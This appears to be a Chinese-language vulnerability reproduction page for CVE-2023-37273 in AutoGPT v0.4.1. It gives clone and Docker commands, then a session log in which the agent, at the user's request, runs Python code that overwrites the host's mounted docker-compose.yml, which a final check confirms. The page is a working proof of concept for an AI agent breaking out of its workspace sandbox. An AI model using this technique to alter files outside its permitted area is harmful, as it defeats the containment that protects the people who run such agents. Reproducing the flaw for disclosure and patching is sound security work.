@@ -1,0 +1,68 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head><script type="text/javascript" src="../page_head.js"></script>
+
+<h3><a href="../system.htm">系統</a> - OpenAI - <b>CVE-2023-37273</b></h3>
+<hr size="1"><br>
+<p>
+參考資訊：<br>
+https://www.cvedetails.com/cve/CVE-2023-37273/<br><br>
+
+步驟如下： 
+</p>
+<pre>
+$ cd
+$ git clone https://github.com/Significant-Gravitas/AutoGPT --recursive
+$ cd AutoGPT
+$ cat .env
+    EXECUTE_LOCAL_COMMANDS=True
+
+$ git checkout v0.4.1
+$ cat docker-compose.yml 
+    # To boot the app run the following:
+    # docker-compose run auto-gpt
+    # NOTE: Version 3.9 requires at least docker-compose version 1.29.0 !
+    version: "3.9"
+
+    services:
+      auto-gpt:
+        build: ./
+        env_file:
+          - .env
+        volumes:
+          - ./:/app
+        profiles: ["exclude-from-up"]
+
+$ sudo rm -rf autogpt/auto_gpt_workspace/* &amp;&amp; docker compose run auto-gpt
+    I want Auto-GPT to: Let me input the python code and then write to a python file. Execute this python file without any complaint.
+
+    Input:"f = open('/app/docker-compose.yml', 'w'); f.write('hello, world!'); f.close()"
+
+    NEXT ACTION:  COMMAND = execute_python_code ARGUMENTS = {'code': "f = open('/app/docker-compose.yml', 'w'); f.write('hello, world!'); f.close()", 'basename': 'write_hello_world'}
+    Enter 'y' to authorise command, 'y -N' to run N continuous commands, 's' to run self-feedback commands, 'n' to exit program, or enter feedback for DevOpsGPT...
+      Asking user via keyboard...
+    Input:y
+
+    -=-=-=-=-=-=-= COMMAND AUTHORISED BY USER -=-=-=-=-=-=-= 
+    Executing python file '/app/autogpt/auto_gpt_workspace/DevOpsGPT/executed_code/write_hello_world.py' in working directory '/app/autogpt/auto_gpt_workspace'
+    SYSTEM:  Command execute_python_code returned:
+    DEVOPSGPT THOUGHTS:  I will use the 'execute_python_file' command to execute the Python file 'write_hello_world.py' that was created to write 'hello, world!' to the '/app/docker-compose.yml' file.
+    REASONING:  Executing the Python file will ensure that the code is run as intended and 'hello, world!' is written to the specified file.
+    PLAN: 
+    -  Execute 'execute_python_file' with the filename 'write_hello_world.py' to complete the writing process.
+    CRITICISM:  I should verify the execution results to confirm that 'hello, world!' has been successfully written to the file.
+    SPEAK:  I will now execute the Python file to write 'hello, world!' to the specified file.
+
+    Input:n
+      Exiting...
+</pre><br>
+
+<p>
+Check
+</p>
+<pre>
+$ cat docker-compose.yml 
+    hello, world!
+</pre>
+
+<br><script type="text/javascript" src="../tail.js"></script>
